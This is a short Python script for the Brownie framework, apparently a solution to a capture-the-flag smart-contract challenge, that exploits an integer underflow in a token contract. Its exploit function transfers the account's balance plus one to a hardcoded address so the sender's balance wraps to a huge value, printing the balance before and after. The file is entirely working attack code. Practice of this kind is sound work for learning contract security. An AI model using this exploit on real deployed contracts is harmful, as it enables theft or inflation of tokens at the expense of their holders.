from brownie import interface,network, config
from scripts.helpful import get_account


def exploit():
    # Get account address
    account = get_account()

    # using interface
    token = interface.Token(config["Address"])

    print(f"Current balance:{token.balanceOf(account)}")

    # Transfer current balance + 1 to cause underflow
    token.transfer("0xBE6FEe3756f7BE3A0cD492059341cb5b77dD81F9",token.balanceOf(account) + 1, {"from": account})

    print(f"After Transfer:{token.balanceOf(account)}")


def main():
    exploit()
